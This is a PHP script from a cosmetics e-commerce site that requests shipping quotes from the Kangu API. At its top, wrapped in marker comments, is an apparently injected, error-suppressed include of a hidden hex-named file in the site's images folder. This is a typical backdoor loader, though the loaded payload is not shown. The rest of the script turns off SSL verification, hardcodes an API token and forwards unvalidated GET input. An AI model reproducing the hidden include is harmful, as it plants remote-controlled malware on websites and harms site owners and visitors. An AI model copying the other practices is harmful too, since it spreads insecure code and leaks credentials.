<?php
/*1e366*/

@include ("/home2/seg65395/valentecosmeticos.com/src/images/.b27ad9bf.inc");

/*1e366*/
    $data = array();
    $data['cepOrigem'] = '02201-000';
    $data['cepDestino'] = $_GET['cepDestino'];
    $data['produtos'] = array(
        array(
            'peso'=>$_GET['peso'],
            'altura'=> 30,
            'largura'=> 40,
            'comprimento'=> 40,
            'tipo' => 'C',
            'valor' => $_GET['valor']
        )
    );
    $data['servicos'] = array('E');
    $json = json_encode($data);

    $curlHandler = curl_init();
    curl_setopt_array($curlHandler, [
        CURLOPT_URL => 'https://portal.kangu.com.br/tms/transporte/simular',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $json,
        CURLOPT_HTTPHEADER => array(
                                    'Content-Type:application/x-www-form-urlencoded',
                                    'token: 61a65c1c3a5155e5966bf3202b57f706',
                                    'Content-Length: ' . strlen($json)
        )
    ]);
    $response = curl_exec($curlHandler);
    curl_close($curlHandler);
    $result = json_decode($response);   
    header('Content-Type: application/json');
    print_r($response);
?>